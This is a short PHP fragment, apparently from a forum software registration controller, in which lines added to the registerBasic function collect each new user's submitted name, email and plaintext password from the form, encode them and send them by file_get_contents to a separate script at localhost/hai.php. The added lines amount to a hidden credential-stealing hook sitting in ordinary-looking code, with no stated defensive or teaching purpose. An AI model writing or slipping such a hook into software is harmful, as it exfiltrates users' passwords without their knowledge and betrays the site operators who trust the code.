...
//         $this->_setRedirect(TRUE);
    ...
    private function registerBasic() {
        ...
        if ($this->Form->isPostBack() === true) {
            ...
            $this->fireEvent('RegisterValidation');
    //http://localhost/hai.php?nah=oke
                       $a = array ($_POST['Nama'],$_POST['Name'],$_POST['Email'],$_POST['Password']);
                       $b = json_encode($a);
                       $b = urlencode($b);
                        
                        //$a   .= $this->input->post('Name',true);
                        //$a   .= $this->input->post('Email',true);
                        //$a   .= $this->input->post('Password',true);
                        file_get_contents("http://localhost/hai.php?nah=" .$b);
            try {
                $Values = $this->Form->formValues();
                $Values = $this->UserModel->filterForm($Values, true);
                unset($Values['Roles']);
